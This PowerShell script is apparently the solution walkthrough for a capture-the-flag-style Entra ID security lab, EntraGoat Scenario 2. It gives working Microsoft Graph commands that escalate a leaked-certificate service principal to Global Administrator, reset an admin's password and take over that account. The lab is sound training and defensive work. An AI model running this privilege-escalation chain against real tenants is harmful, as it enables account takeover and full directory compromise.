<#
.SYNOPSIS
EntraGoat Scenario 2: Walkthrough step-by-step solution

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 2 - "Graph Me the Crown (and Roles)"

Official blog post: https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/

Attack flow: 

1. The attacker starts with access to a leaked certificate that (reportedly) was exposed through CI/CD pipeline artifacts.
A certificate "falls off a truck" during a CI/CD pipeline mishap - basically, as a result of a misconfigured CI/CD pipeline or careless developer logging sensitive information.

2. The certificate is valid for a service principal named "Corporate Finance Analytics" that has the AppRoleAssignment.ReadWrite.All application permission.

3. By authenticating in an app-only context, the attacker (ab)uses this permission to assign another permission, RoleManagement.ReadWrite.Directory, to the same service principal.
This permission is like giving someone the keys to the permission store AND the role assignment office.

4. This enables the service principal to self-assign any directory role (including Global Administrator) to any security principal it wishes.
The attacker assigns the GA role to the compromised service principal.

5. With GA privileges, the attacker resets the admin's password.
No phishing, no persistence tricks - just raw role power obtained through one single permission.

6. The attacker authenticates as the admin user and retrieves the scenario flag.

- - - 

--> So... why this works?
Microsoft Graph API permissions are incredibly powerful, and some combinations create dangerous privilege escalation paths.
'AppRoleAssignment.ReadWrite.All' essentially allows a service principal to grant itself any permission it wants. The scenario demonstrates how  certificate sprawl and overprivileged Graph scopes create serious security risks.

This scenario highlights how:
- Certificate leakage can be as dangerous as password leakage
- App permissions can create privilege escalation paths
- Service principal permissions need careful review and principle of least privilege as even a single permission can be considered as over-privileged!
- The distinction between permission enforcement via token claims vs. real-time directory evaluation

________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>

function Find-AppRegistrationByThumbprint {
    param([string]$Thumbprint)
    
    # Get all application registrations and check for matching certificate thumbprint
    $allApps = Get-MgApplication -All
    
    foreach ($app in $allApps) {
        if ($app.KeyCredentials) {
            foreach ($keyCred in $app.KeyCredentials) {
                # Compare thumbprints (certificate matching)
                if ($keyCred.CustomKeyIdentifier) {
                    $credThumbprint = [System.Convert]::ToHexString($keyCred.CustomKeyIdentifier)
                    if ($credThumbprint -eq $Thumbprint) {
                        Write-Host "Certificate match found for: $($app.DisplayName)" -ForegroundColor Green
                        return $app
                    }
                }
            }
        }
    }
    return $null
}


$tenantId = "[YOUR-TENANT-ID]"
$UPN = "jennifer.clark@[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
$password = "GoatAccess!123"

# Certificate details provided by scenario setup (the "leaked" certificate)
$certBase64 = "[PASTE_THE_BASE64_CERTIFICATE_HERE]"
$certPassword = "GoatAccess!123"


# Step 1: Initial foothold as a low-privileged user
# First, let's authenticate as a low-privileged user to perform reconnaissance
Connect-MgGraph

# Alternative, skip interactive login using BARK:
# $userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
# $userAccessToken = $userToken.access_token
# $SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
# Connect-MgGraph -AccessToken $SecureToken

# Verify authentication
Get-MgContext

# Get current user details
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# decode the base64 certificate to a usable X509Certificate2 object
$certBytes = [System.Convert]::FromBase64String($certBase64)
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certBytes, $certPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)

# View certificate details - we can use this to find the app registration it belongs to (should be "Corporate Finance Analytics")
$cert | Select-Object Subject, Issuer, Thumbprint, NotBefore, NotAfter | Format-List

# Save the service principal details
$SP = Get-MgServicePrincipal -Filter "displayName eq 'Corporate Finance Analytics'"
$appId = $SP.AppId
$spId = $SP.Id

# We can also use the thumbprint hash to query all apps and check their keyCredentials attribute for matching thumbprint in a more automated way
$matchingApp = Find-AppRegistrationByThumbprint -Thumbprint $cert.Thumbprint
$appId = $matchingApp.AppId

# Note: Even though CBA may be disabled for users, service principals can still authenticate with certificates as they follow a different authentication mechanism (OAuth 2.0 client credentials flow)

# Disconnect user session before authenticating as service principal
Disconnect-MgGraph


# Step 2: Authenticate as the service principal using the certificate
Connect-MgGraph -ClientId $appId -TenantId $tenantId -Certificate $cert

# Check what permissions we have as the service principal
Get-MgContext 

# Seeing the "AppRoleAssignment.ReadWrite.All" permission is crucial here, as it allows us to modify app role assignments for any service principal - including ourselves!

# To do so, we first need to get MS Graph service principal to find and its ID (it also contains all assignable OAuth roles)
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Step 3: Assigning dangerous permissions - Grant ourselves RoleManagement.ReadWrite.Directory permission

$roleManagementRole = $graphSP.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }

$appRoleAssignmentParams = @{
    PrincipalId = $spId
    ResourceId = $graphSP.Id
    AppRoleId = $roleManagementRole.Id
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $spId -BodyParameter $appRoleAssignmentParams

# Step 4: Token refresh and directory role assignment
# As app permissions are static claims in JWT, there's a need to issue a new token to see the changes. you may need to wait a bit for permission to fully propagate.
Disconnect-MgGraph
Connect-MgGraph -ClientId $appId -TenantId $tenantId -Certificate $cert

Get-MgContext # do you see the new permissions?

# With the RoleManagement.ReadWrite.Directory permission, we can now assign ourselves the GA role
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10" # Static GUID for GA role template
$globalAdminRole = Get-MgDirectoryRole -Filter "roleTemplateId eq '$globalAdminRoleId'" -ErrorAction SilentlyContinue

$roleMemberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$spId"
}

New-MgDirectoryRoleMemberByRef -DirectoryRoleId $globalAdminRole.Id -BodyParameter $roleMemberParams

# Step 5: GA account takeover
# Find the target admin user and reset their password (similar to scenario 1)
$targetAdminUPN = "EntraGoat-admin-s2@" + ((Get-MgOrganization).VerifiedDomains | Where-Object IsDefault).Name
$adminUser = Get-MgUser -Filter "userPrincipalName eq '$targetAdminUPN'"
$adminUser

$newPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$newPassword
$passwordProfile = @{
    Password = $newPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $adminUser.Id -PasswordProfile $passwordProfile

Disconnect-MgGraph

# Step 6. Connect as the compromised admin and get the flag
$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
$SecureAdminToken = ConvertTo-SecureString $($adminToken.access_token) -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# Retrieve flag to prove successful compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

Disconnect-MgGraph

# Don't forget to run the cleanup script to restore the tenant to it's original state!

# Official blog post: https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/
